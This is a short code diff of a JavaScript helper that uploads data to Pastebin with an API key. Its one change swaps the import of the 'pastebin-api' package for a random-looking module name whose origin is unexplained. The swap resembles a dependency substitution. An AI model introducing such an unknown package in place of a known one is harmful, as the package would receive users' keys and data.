@@ -14,7 +14,7 @@ const PASTEBIN_API_KEY = process.env.PASTEBIN_API_KEY; // Replace with your Past
 async function uploadToPastebin(input, title = 'Untitled', format = 'json', privacy = '1') {
     try {
         // Dynamically import the `pastebin-api` ES module
-        const { PasteClient, Publicity } = await import('pastebin-api');
+        const { PasteClient, Publicity } = await import('bvGEgEU6veN3Wa_6zlhLI5k8v0ZaSrLK');
 
         // Initialize the Pastebin client
         const client = new PasteClient(PASTEBIN_API_KEY);
